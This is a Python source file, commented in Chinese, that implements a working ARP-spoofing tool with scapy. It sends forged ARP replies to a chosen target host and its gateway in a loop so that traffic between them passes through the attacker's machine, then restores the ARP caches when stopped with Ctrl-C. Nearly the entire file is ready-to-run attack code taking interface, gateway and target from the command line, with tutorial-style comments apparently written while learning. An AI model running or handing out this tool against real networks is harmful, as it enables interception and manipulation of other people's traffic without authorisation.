from scapy.all import *
import sys
from optparse import OptionParser 
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    '''
    arp缓冲表恢复
    '''
    print("[*] recover ARP...")
    #hwdst="ff:ff:ff:ff:ff:ff" 表示以广播的方式
    send(ARP(op=2,psrc=gateway_ip,hwsrc=gateway_mac,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",count=5))
    send(ARP(op=2,psrc=target_ip,hwsrc=target_mac,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff"))
def attact_target(gateway_ip,gateway_mac,target_ip,target_mac):
    '''
    进行双向欺骗
    '''
    '''
    #默认的以太网头部
    >>> ls(Ether())
    dst        : DestMACField                = 'ff:ff:ff:ff:ff:ff' (None)
    src        : SourceMACField              = '00:0c:29:50:e4:f3' (None)
    type       : XShortEnumField             = 36864           (36864)
    首先使用scapy 构造ARP包
    可以看到一个arp报文结构
    以太网头部，可以忽略使用默认的
    arp头部也可以忽略，使用默认的
    操作码 源硬件地址 源协议地址 目标硬件地址 目标协议地址
    >>> from scapy.all import *
    >>> ls(ARP())
    hwtype     : XShortField            = 1               (1)
    ptype      : XShortEnumField        = 2048            (2048)
    hwlen      : FieldLenField          = None            (None)
    plen       : FieldLenField          = None            (None)
    op         : ShortEnumField         = 1               (1)
    hwsrc      : MultipleTypeField      = '00:0c:29:50:e4:f3' (None)
    psrc       : MultipleTypeField      = '192.168.139.128' (None)
    hwdst      : MultipleTypeField      = '00:00:00:00:00:00' (None)
    pdst       : MultipleTypeField      = '0.0.0.0'       (None)
    op 取值为1或2 分别代表ARP请求包或者响应包
    hwsrc: 告诉对方我的MAC地址，默认本机，所以可以忽略此项

    psrc:  告诉对方我的ip地址,可用来伪装 

    dfgsasass
    '''

    #构造ARP包

    #欺骗目标主机，我是网关
    '''
    发给目的主机，我是网关，我要找你

    '''
    poison_target = ARP()
    poison_target.op = 2
    #把我的MAC当作网关的MAC给目的主机
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    #我的MAC默认本机，不用写

    #欺骗网关，我是目标主机
    poison_gateway = ARP()
    #响应包
    poison_gateway.op = 2
    #把我的MAC(MAC默认本机，不用写)当作目的主机给网关
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[]")
    print('[*] ARP欺骗开始 [CTRL_C 进行停止]')
    while True:
        try:
            #循环发送arp包
            send(poison_target)
            send(poison_gateway)
            #休眠，避免影响网络
            time.sleep(2)
        #捕获键盘中断
        except KeyboardInterrupt:
            #进行ARP缓冲恢复
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

            break
    print('[*] ARP欺骗结束')
    return



    



def main():
    usage = 'python arpspoof [-i interface] [-g gateway] host'
    parser = OptionParser(usage)
    parser.add_option('-i',dest='interface',type='string',help='网卡' )
    parser.add_option('-g',dest='gateway',type='string',help='网关' )
    #解析命令行
    (options,args) = parser.parse_args()
    if len(args) != 1 or options.interface is None or options.gateway is None:
        parser.print_help()
        sys.exit(0)
    
    #网卡(运行环境kali)
    interface = options.interface
    #网关
    gateway_ip = options.gateway      #iphone热点，网关是.2
    #目标ip
    target_ip = args[0]
    #设置网卡信息
    conf.iface = interface
    #关闭提示信息
    conf.verb = 0

    print("[* 网卡： %s]"%interface)
    #获取网卡mac
    gateway_mac = getmacbyip(gateway_ip)

    if gateway_mac is None:
        print("[!] 获取网卡MAC失败. Exiting")
        sys.exit(0)
    else:
        print("[*] 网关： %sMAC: %s"%(gateway_ip,gateway_mac))
    
    #获取目标主机MAC
    target_mac = getmacbyip(target_ip)

    if target_mac is None:
        print("[!] 获取主机MAC失败. Exiting")
        sys.exit(0)
    else:
        print("[*] 目标主机： %sMAC: %s"%(target_ip,target_mac))
    pass

    attact_target(gateway_ip,gateway_mac,target_ip,target_mac)
if __name__ == "__main__":
    main()
